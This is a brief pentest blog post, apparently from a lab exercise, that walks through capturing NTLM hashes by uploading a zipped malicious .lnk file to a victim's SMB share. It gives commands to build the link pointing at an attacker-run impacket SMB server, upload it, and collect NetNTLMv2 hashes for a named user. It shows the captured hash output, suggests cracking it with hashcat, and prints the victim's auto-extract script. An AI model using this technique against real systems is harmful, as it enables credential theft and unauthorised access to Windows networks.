---
layout: post
title: Zipped LNK files over SMB
description: Zipped LNK files over SMB
summary: Zipped LNK files over SMB
tags: [windows,foothold,rce,smb]
minute: 1
---
## Overview
Attackers can upload a `.zip` file containing `.lnk` file to a smb share. The `.link` file can contain malicuous code such as connecting back to attacker’s own evil smb share.

Once a victim unzips that file, attacker can intercept the user’s hash.

## Requirements
* SMB share on victim machine that attacker has access

## Steps
* Downlod [mslink](http://www.mamachine.org/mslink/index.en.html). You will use that to create a malicuous link file.
* Create a malicuous link file that will connect to your own evil share.

```bash
~/data/tools/mslink_v1.3.sh -l whatever -n hook -i \\\\10.11.40.33\\share -o hook.lnk
```

* Compress it.

```bash
zip hook.zip hook.lnk
```

* Create an SMB share on your attacker machine

```bash
impacket-smbserver -smb2support share .
```

* Upload the zip file to the SMB share of victim machine.

```
smb: \> put hook.zip
```

* Sit back and enjoy

```bash
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.147.136,50222)
[*] AUTHENTICATE_MESSAGE (SET\MichelleWat,SET)
[*] User SET\MichelleWat authenticated successfully
[*] MichelleWat::SET:aaaaaaaaaaaaaaaa:ca86a1caeea26a1753bd2092bb6bb76a:010100000000000080132f632685d701fdefe7ef95805d14000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b000700080080132f632685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000
[*] Closing down connection (10.10.147.136,50222)
[*] Remaining connections []
[*] Incoming connection (10.10.147.136,50223)
[*] AUTHENTICATE_MESSAGE (SET\MichelleWat,SET)
[*] User SET\MichelleWat authenticated successfully
[*] MichelleWat::SET:aaaaaaaaaaaaaaaa:3b1d30ff9e5129ad225cc8129e3a9fa5:010100000000000000aac7632685d701b14749bbc7f0a2db000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b000700080000aac7632685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000
[*] Closing down connection (10.10.147.136,50223)
[*] Remaining connections []
[*] Incoming connection (10.10.147.136,50224)
[*] AUTHENTICATE_MESSAGE (SET\MichelleWat,SET)
[*] User SET\MichelleWat authenticated successfully
[*] MichelleWat::SET:aaaaaaaaaaaaaaaa:39d0e73f4909f98a02f8be457e765a0f:0101000000000000804060642685d701cefc2fd6b5e9dc17000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b0007000800804060642685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000
[*] Closing down connection (10.10.147.136,50224)
[*] Remaining connections []
```

* You will be able to capture the NLMv2 hashes. You can now use hashcat to crack it.

## Other Info
Here is the script that process the zip files inside smb share.

```batch
@echo off
SET source="C:\Shares\Files"
SET extracted="C:\Shares\extracted"

powershell.exe -NoP -NonI -Command "Expand-Archive '%source%\*.zip' '%extracted%'"
FOR /f "tokens=*" %%G IN ('dir /s /b %extracted%\..\*.') DO (explorer %%G)
	
ping -n 3 127.1>NUL
taskkill /IM explorer.exe
rmdir %extracted% /q /s
del %source%\*.zip -j
```

## References
* [How Attackers are Using LNK Files to Download Malware](https://www.trendmicro.com/en_us/research/17/e/rising-trend-attackers-using-lnk-files-download-malware.html)
